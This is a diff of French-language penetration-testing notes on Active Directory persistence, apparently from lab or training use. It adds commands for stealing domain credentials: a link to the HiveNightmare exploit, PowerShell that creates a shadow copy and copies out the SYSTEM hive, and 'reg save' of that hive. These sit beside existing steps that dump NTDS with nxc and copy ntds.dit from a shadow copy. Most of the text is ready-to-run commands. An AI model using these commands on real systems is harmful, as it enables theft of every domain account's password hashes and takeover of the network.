@@ -1,4 +1,4 @@
-﻿# Persistence
+# Persistence
 
 ## Golden Ticket
 
@@ -80,7 +80,7 @@ nxc smb 'IP_DC' -u 'DA_USER' -p 'PASSWORD' --ntds
 ```
 
 **Windows**
-
+https://github.com/GossiTheDog/HiveNightmare
 ```cmd
 :: Sur le DC -  créer la shadow copy
 vshadow.exe -nw -p C:
@@ -91,6 +91,23 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\nt
 
 :: Exporter la ruche SYSTEM
 reg.exe save hklm\system c:\system.bak
+```
+
+Autres méthodes 
+
+```powershell
+# Créer un shadow copy
+$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
+$id = (Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate | Select-Object -Last 1).DeviceObject
+
+# Copier depuis le shadow
+cmd /c "copy `"$id\Windows\System32\config\SYSTEM`" C:\Users\offsec\SYSTEM"
+```
+
+Ou via `reg save` :
+
+```cmd
+reg save HKLM\SYSTEM C:\Users\offsec\SYSTEM.hiv
 ```
 
 Transférer les deux fichiers sur Kali puis parser :
